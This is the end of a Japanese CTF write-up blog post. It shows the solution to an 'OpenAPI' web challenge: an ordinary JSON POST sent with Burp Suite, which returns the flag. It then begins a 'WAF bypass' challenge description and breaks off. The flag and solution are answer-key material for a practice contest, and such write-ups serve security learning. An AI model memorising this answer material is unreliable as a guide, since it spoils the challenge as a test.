  &#34;organizer&#34;: &#34;Sample Company&#34;
}
</code></pre><p>さらに，下の方に以下のように書かれており，ヒントのURLからorganizerは<code>NRI SecureTechnologies</code>だろう．</p>
<pre tabindex="0"><code>Organizer{
description:	
You must put the answer of the question below.

organizer*	string
What is the company name (english) of the organizer team? (Hint: https://www.nri-secure.com/about)

}
example: OrderedMap { &#34;organizer&#34;: &#34;Sample Company&#34; }
</code></pre><p>Burp Suite Community Editionを用いて，以下のようにリクエストを作成し，送信するとflagが得られた．</p>
<pre tabindex="0"><code>POST /openapi/flag HTTP/1.1
Host: web.katagaitai-ctf.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Content-Type: application/json
Connection: close
Content-Length: 45

{ 
 &#34;organizer&#34;: &#34;NRI SecureTechnologies&#34;
}
</code></pre><pre tabindex="0"><code>HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 25 Jan 2025 11:14:52 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{
  &#34;message&#34;: &#34;Correct! The flag is katagaitai-CTF{API_d0cum3n74710n_1s_3xtr3m31y_1mp0r74n7}&#34;
}
</code></pre><h3 id="waf-bypass-250-medium-3-solves">WAF bypass (250 medium [3 Solves])</h3>
<blockquote>
<p>WAF (Web Application Firewall) が通信を中継しています。 katagaitai-CTF{&hellip;} という文字列を見つけると [censored] に変換してしまうようです。<br>
waf_source.zip はWAFのソースコードです。<br>
<a href="http://web.katagaitai-ctf.com/http/step5.html"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/http/step5.html</a><br>
index.js のソースコードから、正規表現によって katagaitai-CTF{.*} を置換していることがわかります。</p>
</blockquote></article><section class="article labels"><a class="category" href="/starknote/categories/security/">Security</a><a class="category" href="/starknote/categories/programming/">Programming</a><a class="tag" href="/starknote/tags/ctf/">CTF</a><a class="tag" href="/starknote/tags/writeup/">writeup</a><a class="tag" href="/starknote/tags/katagaitai/">katagaitai</a></section><section class="article author"><img class="avatar" src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/stable-diffusion/immy.png" alt><p class="name">しゅたるく (Stark)</p><div class="details"><a class="item" href="https://github.com/stark2420" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-github"></span>&nbsp;stark2420</a><a class="item" href="https://twitter.com/stark_puyo" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-twitter"></span>&nbsp;@stark_puyo</a></div>
</section>
</div>

<button id="toggle-button" class="nomal-style">
  <h1>目次</h1>
</button>
<div id="toc-container" class="toc-container">
  
      <h2><a href="#top">目次</a></h2>
      <div id="toc" class="toc">
          <nav id="TableOfContents">
  <ul>
    <li><a href="#learning-session">Learning Session</a>
      <ul>
        <li><a href="#beginners-stack-1-100-learning-session">Beginners STACK #1 (100 Learning Session)</a></li>
        <li><a href="#beginners-stack-2-127-learning-session">Beginners STACK #2 (127 Learning Session)</a></li>
        <li><a href="#beginners-stack-3-188-learning-session">Beginners STACK #3 (188 Learning Session)</a></li>
        <li><a href="#crypto-ex-1-127-learning-session-crypto">Crypto ex-1 (127 Learning Session crypto)</a></li>
        <li><a href="#crypto-ex-2-139-learning-session-crypto">Crypto ex-2 (139 Learning Session crypto)</a></li>
        <li><a href="#where_is_the_main-304-learning-session-rev">where_is_the_main (304 Learning Session Rev)</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#firstpwn-495-easy-8-solves">firstpwn (495 easy [8 Solves])</a></li>
        <li><a href="#got-overwrite-500-medium-1-solves">GOT Overwrite (500 medium [1 Solves])</a></li>
        <li><a href="#byor-500-hard-1-solves">BYOR (500 hard [1 Solves])</a></li>
      </ul>
    </li>
    <li><a href="#rev">Rev</a>
      <ul>
        <li><a href="#operand-451-medium-22-solves">operand (451 medium [22 Solves])</a></li>
        <li><a href="#nazonobasho-495-medium-8-solves">nazonobasho (495 medium [8 Solves])</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#triple-prime-number-200-easy-53-solves">triple prime number (200 easy [53 Solves])</a></li>
        <li><a href="#oracle-service1-387-medium-hard-33-solves">oracle service1 (387 medium-hard [33 Solves])</a></li>
        <li><a href="#oracle-service2-479-medium-hard-15-solves">oracle service2 (479 medium-hard [15 Solves])</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#http-world-pt1-50-warmup-70-solves">HTTP world Pt.1 (50 warmup [70 Solves])</a></li>
        <li><a href="#http-world-pt2-50-warmup-68-solves">HTTP world Pt.2 (50 warmup [68 Solves])</a></li>
        <li><a href="#http-world-pt3-88-easy-55-solves">HTTP world Pt.3 (88 easy [55 Solves])</a></li>
        <li><a href="#parroting-50-warmup-63-solves">Parroting (50 warmup [63 Solves])</a></li>
        <li><a href="#xssns-pt1-82-warmup-56-solves">XSSNS Pt.1 (82 warmup [56 Solves])</a></li>
        <li><a href="#xssns-pt2-194-easy-33-solves">XSSNS Pt.2 (194 easy [33 Solves])</a></li>
        <li><a href="#xssns-pt3-226-medium-22-solver">XSSNS Pt.3 (226 medium [22 Solver])</a></li>
        <li><a href="#openapi-133-easy-47-solved">OpenAPI (133 easy [47 Solved])</a></li>
        <li><a href="#waf-bypass-250-medium-3-solves">WAF bypass (250 medium [3 Solves])</a></li>
      </ul>
    </li>
  </ul>
</nav>
      </div>
  
</div>

<script>
  
  document.querySelectorAll('.toc-container a').forEach(link => {
    link.addEventListener('click', function() {
      
      if (window.innerWidth < 1600) {
        
        const tocContainer = document.querySelector('.toc-container');
        if (tocContainer) {
          tocContainer.style.display = 'none';
        }
      }
    });
  });

  
  document.getElementById('toggle-button').addEventListener('click', function() {
    var toc = document.getElementById('toc-container');
    var button = document.getElementById('toggle-button');
    
    
    if (toc.style.display === 'none') {
      toc.style.display = 'block';
      button.innerHTML = '<h1>目次</h1>';  
    } else {
      toc.style.display = 'none';
      button.innerHTML = '<h1>目次</h1>';  
    }
  });

  function highlightActiveTocItem() {
    const tocItems = document.querySelectorAll('.toc a');

    tocItems.forEach(item => {
      const targetId = item.getAttribute('href').substring(1); 
      const targetElement = document.getElementById(targetId);

      if (targetElement) {
        const rect = targetElement.getBoundingClientRect();
        
        
        const isInViewport = rect.top <= 200 && rect.bottom > 0;

        if (isInViewport) {
          
          tocItems.forEach(item => {
            item.classList.remove('active');
          });
          
          item.classList.add('active');
        }
      }
    });
  }

  
  window.addEventListener('scroll', highlightActiveTocItem);
  document.addEventListener('DOMContentLoaded', highlightActiveTocItem);  
</script>

<div class="article bottom"><section class="article navigation"><p><a class="link" href="/starknote/post/srdnlen-ctf-2025/"><span class="iconfont icon-article"></span>Srdnlen CTF 2025</a></p></section><section class="article discussion"><div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "starknote" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">©2020 Notepadium.</p>
    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a>
<a href='https://ipv6-test.com/validate.php?url=referer'
  ><img src='https://ipv6-test.com/button-ipv6-80x15.png' 
        alt='ipv6 ready' title='ipv6 ready' border='0' 
/></a>
</p></div></section><script defer type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity="sha384-e/4/LvThKH1gwzXhdbY2AsjR3rm7LHWyhIG5C0jiRfn8AN2eTN5ILeztWw0H9jmN" crossorigin="anonymous"></script>
        <script
            type="text/x-mathjax-config">MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });</script></body>

</html>